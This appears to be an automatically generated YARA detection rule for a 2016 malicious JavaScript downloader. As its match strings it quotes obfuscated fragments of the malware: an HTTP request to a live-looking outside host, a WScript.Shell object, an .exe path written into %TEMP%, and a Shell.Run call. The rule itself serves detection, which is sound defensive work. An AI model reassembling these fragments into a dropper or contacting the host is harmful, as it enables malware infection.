rule sig_20160330_3c2cc721f9a12e2cf1f6bac0fe522200 {
  meta:
    description = "datamaliciousorder - file 20160330_3c2cc721f9a12e2cf1f6bac0fe522200.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "25215777c7c7fdbe0daf09ac055c2cfe2d9c55903d662a4416fb5238324588c8"

  strings:
    $s1  = "_I0[_BC](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s2  = "var _T = function _J() {return WScript[_PU](\"WScript\"+\".Shell\");}(), _MO = 11;" fullword ascii
    $s3  = "function _TX(_KH, _Y0){_W1 = _W1 * 1; return _KH - _Y0;};" fullword ascii
    $s4  = "if (_I0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _QW() {return _T[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"K2PMJBgwL1klC.ex\" + \"e\";};" fullword ascii
    $s6  = "function _GR(){return _H + \"\";};" fullword ascii
    $s7  = "function _I() {return ((_CR == true) && (_CR == _CF)) ? 1 : _W1;};" fullword ascii
    $s8  = "function _YU(_FQ){_T[\"Run\"](_FQ, _W1, _W1);};" fullword ascii
    $s9  = "function _W()" fullword ascii
    $s10 = "function _J0(){return 22;};" fullword ascii
    $s11 = "return _TX(_Y, _TY);" fullword ascii
    $s12 = "var _HO = new this[\"Date\"]();" fullword ascii
    $s13 = "function _XU(){return _PU;};" fullword ascii
    $s14 = "function _UC(_L) {var _S = (1, 2, 3, 4, 5, _L); return _S;};" fullword ascii
    $s15 = " while (_CC){" fullword ascii
    $s16 = "var _CR = false;" fullword ascii
    $s17 = "var _CF = false;" fullword ascii
    $s18 = "_CF = true; " fullword ascii
    $s19 = "_CR = true; " fullword ascii
    $s20 = "var _VW = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}